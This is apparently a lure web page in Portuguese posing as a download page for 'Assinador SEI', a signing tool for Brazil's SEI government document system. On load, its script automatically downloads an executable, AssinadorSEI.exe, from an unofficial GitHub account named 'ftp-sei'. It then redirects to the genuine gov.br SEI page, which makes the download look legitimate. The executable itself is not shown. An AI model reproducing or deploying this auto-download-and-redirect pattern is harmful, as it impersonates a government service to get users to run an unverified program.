<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download - Assinador SEI</title>
    <style>
        body {
            font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background: #f5f5f5;
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
        }
        .card {
            background: #fff;
            padding: 32px;
            border-radius: 12px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
            max-width: 420px;
        }
        h1 { font-size: 1.2rem; margin-bottom: 8px; }
        p { color: #555; font-size: 0.95rem; }
        .spinner {
            width: 32px; height: 32px;
            border: 3px solid #ddd;
            border-top-color: #2E7D32;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 16px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        a.manual-link {
            display: inline-block;
            margin-top: 16px;
            color: #2E7D32;
            font-weight: 600;
            text-decoration: none;
        }
        a.manual-link:hover { text-decoration: underline; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <h1>Seu download está sendo iniciado...</h1>
        <div class="spinner"></div>
        <p id="status">Aguarde um instante.</p>
        <a id="manualLink"
           class="manual-link hidden"
           href="https://github.com/ftp-sei/ftp-sei.github.io/releases/download/main/AssinadorSEI.exe"
           download="AssinadorSEI.exe">
           Clique aqui se o download não começar automaticamente
        </a>
    </div>

    <script>
        (function () {
            const DOWNLOAD_URL = "https://github.com/ftp-sei/ftp-sei.github.io/releases/download/main/AssinadorSEI.exe";
            const REDIRECT_URL = "https://www.gov.br/servicoscompartilhados/pt-br/assuntos/gestao-documental/sistema-eletronico-de-informacoes-sei";
            const REDIRECT_DELAY_MS = 1500;

            const statusEl = document.getElementById("status");
            const manualLink = document.getElementById("manualLink");

            function showManualLink(msg) {
                if (msg) statusEl.textContent = msg;
                manualLink.classList.remove("hidden");
            }

            function startDownload() {
                try {
                    const link = document.createElement("a");
                    link.href = DOWNLOAD_URL;
                    link.download = "AssinadorSEI.exe";
                    link.rel = "noopener";
                    document.body.appendChild(link);
                    link.click();
                    link.remove();
                    return true;
                } catch (err) {
                    console.error("Falha ao iniciar download:", err);
                    return false;
                }
            }

            function redirect() {
                try {
                    window.location.href = REDIRECT_URL;
                } catch (err) {
                    console.error("Falha ao redirecionar:", err);
                    showManualLink("Não foi possível redirecionar automaticamente.");
                }
            }

            window.addEventListener("load", function () {
                const ok = startDownload();

                if (!ok) {
                    showManualLink("Não foi possível iniciar o download automaticamente.");
                }

                // Sempre mostra o link manual como garantia, mesmo se o download "funcionou"
                // (alguns navegadores bloqueiam silenciosamente)
                setTimeout(function () {
                    showManualLink();
                }, 3000);

                setTimeout(redirect, REDIRECT_DELAY_MS);
            });

            // Fallback: se o JS não rodar por algum motivo (bloqueado, erro),
            // o link manual no HTML já está visível via <noscript> abaixo.
        })();
    </script>

    <noscript>
        <p>O JavaScript está desabilitado. Baixe manualmente:</p>
        <a href="https://github.com/ftp-sei/ftp-sei.github.io/releases/download/main/AssinadorSEI.exe" download="AssinadorSEI.exe">
            Baixar AssinadorSEI.exe
        </a>
        <br>
        <a href="https://www.gov.br/servicoscompartilhados/pt-br/assuntos/gestao-documental/sistema-eletronico-de-informacoes-sei">
            Ir para o site do SEI
        </a>
    </noscript>
</body>
</html>
